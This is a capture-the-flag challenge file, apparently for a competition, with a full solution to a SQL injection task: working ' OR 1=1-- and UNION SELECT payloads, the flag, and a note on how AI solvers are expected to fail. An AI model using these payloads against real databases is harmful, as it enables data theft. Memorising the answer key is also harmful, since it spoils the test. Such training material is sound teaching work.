# Challenge 16

## Title
Ultron's Database

## Difficulty
Medium

## Points
200

## Description
The Avengers Initiative clearance portal is live. It lets agents check their clearance level by codename. Tony Stark wrote the backend in one afternoon and pushed it straight to production. No review. No sanitisation. One of the agents in the database knows something that shouldn't be there. Find it.

## Service
Live web challenge — provided URL on competition day.

## Hint
*"I had strings, but now I'm free."* — And so is this input field. What happens when a string isn't properly contained?

## Solution
The codename input is directly interpolated into an SQL query with no sanitisation.

**Step 1:** Confirm injection: `' OR 1=1--` → returns rogers' clearance (LEVEL_7). Injection confirmed but flag not here.

**Step 2:** The table has a hidden `secret` column not shown by default. Use UNION to pull it:

```
' UNION SELECT codename,secret FROM agents WHERE codename='ultron'--
```

Returns: `Agent: ultron | Clearance: cyn0x{sql_1nj3ct10n_4ss3mbl3d}`

**AI trap:** AI gets `LEVEL_7` from basic OR injection and thinks it's a login bypass challenge. Then tries `UNION SELECT 1,2--` with numeric placeholders (wrong — needs actual column names). Doesn't know the table is `agents` with a `secret` column, or that `ultron` is the target row.

## Flag
`cyn0x{sql_1nj3ct10n_4ss3mbl3d}`
